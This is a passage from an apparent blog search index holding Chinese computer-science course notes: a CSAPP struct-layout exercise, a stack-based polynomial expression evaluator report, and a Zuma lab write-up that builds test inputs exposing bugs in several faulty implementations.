class="token operator">-</span><span class="token number">3.72066e-103</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请补全以下类型和常数:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">T1<span class="token operator">:</span> <span class="token keyword">short</span>T2<span class="token operator">:</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span>T3<span class="token operator">:</span> <span class="token keyword">int</span>T4<span class="token operator">:</span> <span class="token keyword">double</span>N<span class="token operator">:</span> <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>struct A​</code> 的内存布局 (需绘制出 <code>struct B</code> 中各变量):</p></li></ol><div align="center"><img src="/pic/11.png" width="100%" height="100%"></div>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polynomial</title>
      <link href="/19/"/>
      <url>/19/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA2"><a href="#CST-PA2" class="headerlink" title="CST PA2"></a>CST PA2</h1><h2 id="2-2-Polynomial"><a href="#2-2-Polynomial" class="headerlink" title="2-2 Polynomial"></a>2-2 Polynomial</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>将待计算字符串中的常数对象和变量 <code>x</code> 均视为多项式——常数视为零次多项式, <code>x</code> 视为一次多项式, 那么本题相当于一个中缀多项式表达式求值的过程.</p><p>因此基本思路与中缀表达式求值相同. 编写一个栈类 <code>class Stack</code> 存储运算数和运算符, 同时编写一个多项式类 <code>class Poly</code> 并重载 <code>+</code>、<code>-</code>、<code>*</code>、<code>^</code> 运算符进行计算.</p><p>我们遍历读入的表达式, 同时设置一个多项式栈和运算符栈:</p><ul><li>如果读入数字, 则持续遍历直到不再读到数字, 并将这些数字合并为一个完整的数后转换为零次多项式加入多项式栈.</li></ul><p>接下来需要判断表达式中是否省略了 <code>'*'</code> 运算符.</p><ul><li>如果当前字符为 <code>'('</code> 或 <code>'x'</code>, 此时读取当前字符的上一个字符并进行判断, 如果上一个字符为数字或 <code>'x'</code> 或 <code>')'</code>, 则说明此处省略了乘号. 此时将上一个字符改为乘号并返回处理即可 (因为上一个字符已处理完毕, 对其进行更改不会影响已有结果.)</li></ul><p>接下来处理读取 <code>'x'</code> 情况和读取运算符情况即可.</p><ul><li>如果读入 <code>'x'</code>, 将其转换为一次多项式并加入多项式栈.</li><li>如果读入运算符, 则需比较当前运算符和运算符栈顶符号间的优先级:<ul><li>如果栈顶运算符优先级更低, 则推迟计算, 将当前运算符入栈;</li><li>如果两运算符优先级相等, 那么当前运算符为 <code>')'</code> 或者尾哨兵 <code>'\0'</code>, 直接退栈并接收下一个字符即可;</li><li>如果栈顶运算符优先级更高, 则取出多项式栈顶的两个元素执行运算并将结果压入多项式栈中.</li></ul></li><li>最后多项式栈仅剩一个多项式对象, 即中缀表达式的最终运算结果. 将其记录的系数信息逐项输出即可.</li></ul><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>基于数组实现了栈的数据结构:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">template <span class="token operator">&lt;</span>class T<span class="token operator">&gt;</span>class Stack <span class="token punctuation">{</span>private<span class="token operator">:</span>    T<span class="token operator">*</span> _a<span class="token punctuation">;</span>    <span class="token keyword">int</span> _size<span class="token punctuation">;</span>    <span class="token keyword">int</span> _capacity<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token function">Stack</span><span class="token punctuation">(</span><span class="token keyword">int</span> capacity<span class="token punctuation">)</span><span class="token punctuation">;</span>    bool <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    T<span class="token operator">&amp;</span> <span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">const</span> T<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    T <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中每次基本操作时间复杂度均为 $O(1)$.</p><p>实现多项式类:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">class Poly <span class="token punctuation">{</span>private<span class="token operator">:</span>    <span class="token keyword">int</span> coe<span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> deg<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token function">Poly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Poly</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly operator<span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly operator<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly operator<span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    Poly operator<span class="token operator">^</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化常数多项式, 使用构造函数 <code>Poly(long long a)</code>; 初始化一次多项式, 使用构造函数 <code>Poly()</code>.</p><p>在每次二元运算操作后, 将运算结果更新至第一个操作对象中, 同时更新其记录的最高次数.</p><h3 id="问题发现与优化"><a href="#问题发现与优化" class="headerlink" title="问题发现与优化"></a>问题发现与优化</h3><p>开始的提交中测例 <code>15</code> 会出现 <code>Time Limit Exceeded</code> 的问题. 通过对代码具体实现进行了若干优化解决了该问题.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 102</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Poly operator<span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Poly <span class="token operator">&amp;</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 实现 * 运算符.</span>    bool flag <span class="token operator">=</span> false<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 优先考虑被乘数为常数情况.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>deg <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token comment">// 再考虑乘数为常数情况.</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>deg <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>推测是因为多项式乘法的时间常数过大, 导致实际运算超时. 在多项式乘法中添加了判断两个多项式次数是否为 <code>0</code> 的过程, 使得计算常多项式乘积耗时降低, 解决了测例 <code>15</code> 的 <code>Time Limit Exceeded</code> 问题.</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>算法时间复杂度主要来自遍历输入表达式与多项式计算两部分:</p><p>在遍历输入表达式时, 每个元素最多入栈和出栈一次, 每次操作均为常数时间, 从而时间复杂度与输入表达式长度成正比, 为 $O(n)$;</p><p>在进行多项式计算时, 多项式栈中每两个对象经一次计算后返回一个对象. 若输入表达式能够贡献 <code>k</code> 个表达式, 则需进行 <code>k - 1</code> 次计算得出最终结果. 注意到幂运算所需时间最长, 因此最差情况为 <code>64</code> 次多项式进行幂运算, 所需为常数时间. 从而时间复杂度为 $O(n)$;</p><p>综上, 算法总时间复杂度为 $O(n)$, 具有小的时间常数.</p><p>算法空间复杂度主要来自读取字符串、转换为多项式并存储数据的过程:</p><p>由于输入串的长度上界为 <code>1,000,000</code>, 那么其实际可贡献同时入栈的多项式数和运算符数最坏情况也不会超过 <code>Max = 900,000</code>. 使用 <code>Max</code> 作为容量初始化栈:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Stack<span class="token operator">&lt;</span>Poly<span class="token operator">&gt;</span> opnd <span class="token operator">=</span> Stack<span class="token operator">&lt;</span>Poly<span class="token operator">&gt;</span><span class="token punctuation">(</span>Max<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 多项式栈.</span>Stack<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;</span> optr <span class="token operator">=</span> Stack<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>Max<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 运算符栈.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>主要内存被分配给多项式栈与运算符栈, 程序占用的极限内存约为: $4B\times 66\times 9 \times 10^5 + 1B \times 9 \times 10^5 = 238500KB = 233.9MB &lt; 256MB$.</p><p>恰好满足题意.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zuma</title>
      <link href="/18/"/>
      <url>/18/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-LAB1"><a href="#CST-LAB1" class="headerlink" title="CST LAB1"></a>CST LAB1</h1><h2 id="Zuma"><a href="#Zuma" class="headerlink" title="Zuma"></a>Zuma</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码 1"></a>代码 1</h3><ul><li><p>错误类型: <code>Runtime Error</code>  </p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> rank<span class="token punctuation">;</span>    <span class="token keyword">int</span> right <span class="token operator">=</span> rank<span class="token punctuation">;</span>    <span class="token keyword">char</span> color <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>rank<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">--</span>left<span class="token punctuation">;</span>    left <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">++</span>right<span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> right <span class="token operator">-</span> left<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">play</span><span class="token punctuation">(</span>left <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>play</code> 函数并未显式调用 <code>return</code>, 在这里 <code>left</code> 的范围为 <code>[0, rank]</code>.</p><p>因此, 若 <code>left</code> 在函数体内变为 <code>0</code>, 那么在尾部调用 <code>play(left - 1)</code> 时便会访问到越界的内存 <code>a.at(-1)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>AAB</code> 经第一次消除后变为 <code>B</code>, 因为消除发生在串的最前部, 此时 <code>play</code> 函数内 <code>left = 0</code>, 接下来调用 <code>play(left - 1)</code> 时便会访问到越界的内存 <code>a.at(-1)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">AAB<span class="token number">1</span><span class="token number">1</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码 2"></a>代码 2</h3><ul><li><p>错误类型: <code>Runtime Error</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> next <span class="token operator">=</span> left<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> next <span class="token operator">=</span> left <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token function">play</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处 <code>play</code> 函数处理了 <code>left = 0</code> 的情况. 但如果经过消除, 在函数尾部串 <code>a</code> 为空, 此时 <code>left = 0</code>, 发生调用 <code>play(0)</code> 便会越界访问了空串 <code>a</code> 的元素 <code>a.at(0)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>AA</code> 经第一次消除后变为空串, 因为消除发生在串的最前部, 此时 <code>play</code> 函数内 <code>next = left = 0</code>, 接下来调用 <code>play(next)</code> 时便会访问到越界的内存 <code>a.at(0)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">AA<span class="token number">1</span><span class="token number">1</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码 3"></a>代码 3</h3><ul><li><p>错误类型: <code>Time Limit Exceeded</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">play</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这份代码在逻辑上是正确的, 但是由于采用数组实现, 时间复杂度正比于输入数据的规模. 因为数组的插入与删除操作复杂度为 $O(n)$, 那么当输入规模过大时, 会导致 <code>Time Limit Exceeded</code>.</p><ul><li>测例构造思路</li></ul><p>构造长度为 <code>500000</code> 的串 <code>a</code>, 并在串 <code>a</code> 的头部进行 <code>500000</code> 次插入操作, 导致超时.</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码 4"></a>代码 4</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">--</span>left<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">++</span>right<span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> right <span class="token operator">-</span> left<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> left <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">play</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数的实现事实上并未能访问 <code>a.at(0)</code> 的具体元素, 注意到 <code>left</code> 可被赋值为 <code>0</code>, 此时在 <code>erase</code> 操作中会删去 <code>a.at(0)</code> 位置的元素, 如果在此时进行了消除则会导致 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>BAC</code> 经第一次插入 <code>A</code> 后 <code>left = 0</code>, <code>right = 3</code>, 错误地在串头部发生消除, 串 <code>a</code> 变为 <code>C</code>, 产生 <code>Wrong Answer</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">BAC<span class="token number">1</span><span class="token number">1</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码 5"></a>代码 5</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> m<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主函数在读取字符串 <code>a</code> 时使用了 <code>cin</code>, 因为 <code>cin</code> 并不能读取空串, 因此这种方式不具有鲁棒性. 这种情况下, 程序会将本属于 <code>m</code> 的值读入 <code>a</code>, 进而导致错误.</p><ul><li>测例构造思路</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        cin <span class="token operator">&gt;&gt;</span> rank <span class="token operator">&gt;&gt;</span> color<span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">cbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> rank<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">play</span><span class="token punctuation">(</span>rank<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将输入串 <code>a</code> 置空, 程序会将本属于 <code>m</code> 的值 <code>2</code> 读入 <code>a</code>, 将值 <code>0</code> 读入 <code>m</code>, 此时循环会因 <code>m = 0</code> 被直接跳过执行 <code>cout &lt;&lt; a &lt;&lt; endl</code>, 产生 <code>Wrong Answer</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token number">2</span><span class="token number">0</span> A<span class="token number">0</span> B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码 6"></a>代码 6</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Rank pos <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>rank<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>cur <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">get</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> succ_len <span class="token operator">=</span> plen<span class="token punctuation">[</span>pos<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">-</span> pos<span class="token punctuation">.</span>second<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>succ_len <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">memmove</span><span class="token punctuation">(</span>cur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> cur<span class="token punctuation">,</span> succ_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>cur <span class="token operator">=</span> ch<span class="token punctuation">;</span>    alen<span class="token operator">++</span><span class="token punctuation">;</span>    plen<span class="token punctuation">[</span>pos<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数在插入字符的时候并未考虑是否会超出数组大小, 直接执行 <code>memmove</code> 操作. 由于字符串采用二维数组 <code>p[1 &lt;&lt; 12][plen_bound]</code> 形式存储, 占用了一块连续的内存. 若一直进行插入操作而不发生消除, 那么在单个数组到达最大容量后便会覆盖下个数组的内容, 进而导致输出串 <code>a</code> 时产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>只需向字符串头部不停执行插入操作而不产生消除即可, 在单个数组到达最大容量后便会覆盖下个数组的内容, 进而导致输出串 <code>a</code> 时产生 <code>Wrong Answer</code>.</p><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码 7"></a>代码 7</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 计算需要消除的开区间 (l, r)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>            l<span class="token punctuation">.</span>second<span class="token operator">--</span><span class="token punctuation">;</span>            dis<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>second <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                l<span class="token punctuation">.</span>first<span class="token operator">--</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>                    l<span class="token punctuation">.</span>second <span class="token operator">+=</span> plen<span class="token punctuation">[</span>l<span class="token punctuation">.</span>first<span class="token 